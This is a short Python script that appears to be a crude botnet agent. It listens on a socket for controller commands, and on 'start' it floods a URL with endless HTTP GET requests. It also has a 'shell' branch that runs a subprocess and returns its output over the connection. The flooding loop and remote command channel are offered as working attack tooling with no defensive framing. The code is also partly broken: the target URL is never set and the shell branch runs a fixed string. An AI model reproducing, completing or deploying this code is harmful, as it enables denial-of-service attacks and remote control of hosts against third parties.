import socket, os, requests, subprocess

ip = '10.9.1.23'
port = 6664

def doz(url):
	try:
		while True:
			r = requests.get(url)

	except:
		pass


def c_listen():
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	con, adr = s.accept()
	print(adr,' is connected!')
	url = ''

	while True:
		cmd = con.recv(1024).decode()
		if cmd == 'gg':
			con.send(f'connection closed from {ip}'.encode())
			con.close()
			break
		elif cmd == 'tar':
			con.send('target loaded'.encode())
			print(cmd)
			con.close()
		elif cmd == 'start':
			doz(url)
		elif cmd == 'shell':
			#con.send('zhell'.encode())
			cmd = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
			con.send(cmd.stdout.read())
			con.send(cmd.stderr.read())
		else:
			con.send('command not found!'.encode())

	


c_listen()
